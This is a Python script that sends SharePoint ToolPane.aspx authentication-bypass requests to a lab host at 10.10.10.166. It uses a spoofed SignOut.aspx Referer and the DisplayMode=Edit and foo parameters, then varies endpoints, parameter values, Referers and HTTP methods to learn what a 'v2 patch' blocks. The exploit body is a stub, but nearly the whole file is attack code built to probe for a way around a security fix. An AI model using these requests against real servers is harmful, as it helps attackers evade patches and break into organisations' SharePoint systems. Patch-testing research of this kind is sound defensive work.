# Purpose: Test exploit mutations to understand v2 patch behavior
# Outcome: Identify what specific aspects are blocked by the patch

import requests
from urllib.parse import quote

target_base = "http://10.10.10.166"

# Original exploit parameters
original_endpoint = "/_layouts/15/ToolPane.aspx"
original_query = "DisplayMode=Edit&foo=/ToolPane.aspx"
original_referer = "/_layouts/SignOut.aspx"

# Simple test body (without full payload to test authentication)
test_body = "MSOTlPn_DWP=test&MSOTlPn_Uri=http%3A%2F%2Ftest"

headers_base = {
    "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
    "User-Agent": "Mozilla/5.0",
}

print("[*] Testing exploit mutations to understand v2 blocking...")
print(f"[*] Target: {target_base}")

# Test 1: Different endpoints
endpoints = [
    "/_layouts/15/ToolPane.aspx",
    "/_layouts/ToolPane.aspx",
    "/_layouts/15/start.aspx",
    "/_layouts/15/WebPartGallery.aspx",
    "/_vti_bin/WebPartPages.asmx",
    "/_layouts/15/Picker.aspx",
]

print("\n[Test 1] Different endpoints with original params:")
for endpoint in endpoints:
    url = f"{target_base}{endpoint}?{original_query}"
    headers = {**headers_base, "Referer": original_referer}
    try:
        r = requests.post(url, headers=headers, data=test_body, timeout=10, allow_redirects=False)
        print(f"    {endpoint}: {r.status_code}")
    except Exception as e:
        print(f"    {endpoint}: Error - {str(e)[:40]}")

# Test 2: Different DisplayMode values
print("\n[Test 2] Different DisplayMode values:")
display_modes = ["Edit", "edit", "EDIT", "Design", "Browse", ""]
for mode in display_modes:
    query = f"DisplayMode={mode}&foo=/ToolPane.aspx" if mode else "foo=/ToolPane.aspx"
    url = f"{target_base}{original_endpoint}?{query}"
    headers = {**headers_base, "Referer": original_referer}
    try:
        r = requests.post(url, headers=headers, data=test_body, timeout=10, allow_redirects=False)
        print(f"    DisplayMode={mode or 'NONE'}: {r.status_code}")
    except Exception as e:
        print(f"    DisplayMode={mode or 'NONE'}: Error - {str(e)[:40]}")

# Test 3: Different Referer patterns
print("\n[Test 3] Different Referer patterns:")
referers = [
    "/_layouts/SignOut.aspx",
    "/_layouts/15/SignOut.aspx",
    f"{target_base}/_layouts/15/SignOut.aspx",
    "/_layouts/15/start.aspx",
    None,  # No Referer
    "/_layouts/15/ToolPane.aspx",  # Same as target
]
for ref in referers:
    url = f"{target_base}{original_endpoint}?{original_query}"
    headers = {**headers_base}
    if ref:
        headers["Referer"] = ref
    try:
        r = requests.post(url, headers=headers, data=test_body, timeout=10, allow_redirects=False)
        print(f"    Referer={ref or 'NONE'}: {r.status_code}")
    except Exception as e:
        print(f"    Referer={ref or 'NONE'}: Error - {str(e)[:40]}")

# Test 4: Different foo parameter values
print("\n[Test 4] Different foo parameter values:")
foo_values = [
    "/ToolPane.aspx",
    "ToolPane.aspx",
    "/",
    "",
    "/_layouts/15/SignOut.aspx",
    "../SignOut.aspx",
]
for foo in foo_values:
    query = f"DisplayMode=Edit&foo={quote(foo)}" if foo else "DisplayMode=Edit"
    url = f"{target_base}{original_endpoint}?{query}"
    headers = {**headers_base, "Referer": original_referer}
    try:
        r = requests.post(url, headers=headers, data=test_body, timeout=10, allow_redirects=False)
        print(f"    foo={foo or 'NONE'}: {r.status_code}")
    except Exception as e:
        print(f"    foo={foo or 'NONE'}: Error - {str(e)[:40]}")

# Test 5: Different HTTP methods
print("\n[Test 5] Different HTTP methods:")
for method in ["GET", "POST", "PUT", "OPTIONS", "HEAD"]:
    url = f"{target_base}{original_endpoint}?{original_query}"
    headers = {**headers_base, "Referer": original_referer}
    try:
        r = requests.request(method, url, headers=headers, data=test_body if method in ["POST", "PUT"] else None, timeout=10, allow_redirects=False)
        print(f"    {method}: {r.status_code}")
    except Exception as e:
        print(f"    {method}: Error - {str(e)[:40]}")

print("\n[*] Mutation test complete")
